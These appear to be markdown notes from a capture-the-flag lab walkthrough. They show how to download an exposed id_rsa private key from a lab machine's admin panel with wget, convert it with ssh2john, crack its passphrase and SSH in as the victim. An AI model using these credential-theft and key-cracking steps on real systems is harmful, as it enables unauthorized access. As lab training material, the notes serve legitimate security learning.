![[bruteit3.png]]

### SSH to victim
1. Download the rsa key
```shell
wget [http://MACHINE_IP/admin/panel/id_rsa](http://MACHINE_IP/admin/panel/id_rsa)
```

2. Change the key into john understandable format
```shell
ssh2john temp_rsa_key.txt > id_rsa.txt
```

3. Find the passphrase to this key
![[bruteit8.png]]

4. SSH to victim
![[bruteit9.png]]
